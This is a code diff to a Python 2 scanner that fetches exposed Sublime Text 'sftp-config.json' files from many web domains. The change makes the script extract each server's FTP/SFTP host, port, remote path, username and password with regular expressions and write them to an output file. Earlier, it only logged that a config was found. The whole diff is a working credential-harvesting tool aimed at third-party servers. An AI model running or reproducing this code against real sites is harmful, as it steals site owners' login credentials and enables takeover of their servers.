@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import sys, os, argparse, urllib2,json
+import sys, os, argparse, urllib2,re
 from urllib2 import Request
 #from urllib.request import urlopen
 from multiprocessing import Pool
@@ -18,12 +18,45 @@ def extractftp(line):
 
 		# Ensure it's the correct file and not just a random page
 		if('save_before_upload' in answer):
-                    data = json.loads(answer)
+		    line = 'http://' + domain + '/sftp-config.json, '
+		    ftptype = re.search('"type".[^"]*"(.[^"]*)', answer)
+		    if ftptype:
+			line += ftptype.group(1)+', '
+		    else:
+			line += 'none, '
+		    ftphost = re.search('"host".[^"]*"(.[^"]*)', answer)
+		    if ftphost:
+			line += ftphost.group(1)+', '
+		    else:
+			line += 'none, '
+                    ftpport = re.search('"port".[^"]*"(.[^"]*)', answer)
+		    if ftpport:
+			line += ftpport.group(1)+', '
+		    else:
+			line += 'none, '
+		    ftppath = re.search('"remote_path".[^"]*"(.[^"]*)', answer)
+		    if ftppath:
+			line += ftppath.group(1)+', '
+		    else:
+			line += 'none, '
+		    ftpuser = re.search('"user".[^"]*"(.[^"]*)', answer)
+		    if ftpuser:
+			line += ftpuser.group(1)+', '
+		    else:
+			line += 'none, '
+		    ftppassword = re.search('"password".[^"]*"(.[^"]*)', answer)
+		    if ftppassword:
+			line += ftppassword.group(1)+', '
+		    else:
+			line += 'none, '
+
+		    print line
+
 		    # Write match to OUTPUTFILE
-		    #fHandle = open(OUTPUTFILE,'a')
-		    #fHandle.write(domain + ", sftp-config.json, "+req.headers.get('content-length')+"\n")
-		    #fHandle.close()
-		    #print("[*] Found config: " + domain)
+		    fHandle = open(OUTPUTFILE,'a')
+		    fHandle.write(line+"\n")
+		    fHandle.close()
+		    print("[*] Found config: " + domain)
 		    return
 
 	except Exception as e:     
